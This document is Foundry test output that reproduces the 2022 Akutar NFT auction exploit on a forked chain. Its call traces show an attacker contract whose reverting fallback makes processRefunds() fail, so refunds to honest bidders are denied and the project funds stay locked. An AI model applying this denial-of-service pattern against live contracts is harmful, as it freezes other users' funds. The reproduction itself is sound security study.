Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 302.68ms (282.96µs CPU time)

Ran 2 tests for src/test/2022-04/AkutarNFT_exp.sol:AkutarNFTExploit
[PASS] testDOSAttack() (gas: 498625)
Logs:
  honestUser Balance before Bid:  4
  honestUser Balance after Bid:  0
  processRefunds() REVERT :  Failed to refund bidder
  honestUser Balance post processRefunds:  0

Traces:
  [498625] AkutarNFTExploit::testDOSAttack()
    ├─ [0] VM::prank(AkutarNFTExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 
    ├─ [68163] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::bid{value: 3500000000000000000}(1)
    │   └─ ← [Stop] 
    ├─ [0] console::log("honestUser Balance before Bid: ", 4) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::prank(0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4)
    │   └─ ← [Return] 
    ├─ [17793] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::bid{value: 3750000000000000000}(1)
    │   ├─ [0] 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4::fallback{value: 250000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] console::log("honestUser Balance after Bid: ", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::warp(1650674809 [1.65e9])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(AkutarNFTExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 
    ├─ [377472] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::processRefunds()
    │   ├─ [0] 0x96EA017109C7691a3080e16C2095B547e29d82f5::fallback{value: 6300000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xb7A4173fD350a28a52D99F7434316e212a385C5B::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xBc9c3b0bd4B17e57A2F4a7b72eb37b30A8782C71::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xfEA95b37a5e40812fedCCB84b3c54610085C1e89::fallback{value: 6300000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x0eAaEAb621b6718f0E2A486be5bc976Cb8cC3A9E::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x3128979AE4F79B90664520a83e20e0CC83e6E5C9::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x3aF7f85584184F63b533e547E255AE7265EE6A90::fallback{value: 6300000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xA8f056bF55FA15f326759BDED5439583fbA304C9::fallback{value: 6300000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x918270712eE5065b3e36eb5a331fFCd198058f57::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x6b37547ec97599b77388570a48bB6E193AA25F27::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x2b333AE41632c0266AE275e811bB5EeB3F21fd03::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x83aF5a649B2164F5e51b4F6D7e650426B35665f7::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x4862a36794d271bF7d5c5DA41D30e00684b0BAD6::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x491892CCDfBe0BB2ca35FFE442baDe74B6bD31ad::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x21Bb3Eb127B7b96f39E3e99B0Fb7F4051C4994a8::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xbE612fAaCf608E735ec40F059bfB9D921052a095::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xA83fA9c834BB5ABE25F9c56EB5845b3203Df94F2::fallback{value: 6300000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4::fallback{value: 4200000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [0] 0x703d6dbcEda7455D69349c659eDd37a39ebc8E7d::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [45] AkutarNFTExploit::fallback{value: 2100000000000000000}()
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] revert: Failed to refund bidder
    ├─ [0] console::log("processRefunds() REVERT : ", "Failed to refund bidder") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("honestUser Balance post processRefunds: ", 0) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

[PASS] testclaimProjectFunds() (gas: 23436)
Logs:
  claimProjectFunds() ERROR :  Refunds not yet processed

Traces:
  [23436] AkutarNFTExploit::testclaimProjectFunds()
    ├─ [0] VM::warp(1650672435 [1.65e9])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9)
    │   └─ ← [Return] 
    ├─ [8785] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::claimProjectFunds()
    │   └─ ← [Revert] revert: Refunds not yet processed
    ├─ [0] console::log("claimProjectFunds() ERROR : ", "Refunds not yet processed") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 309.85ms (5.78ms CPU time)

Ran 2 test suites in 311.38ms (612.53ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
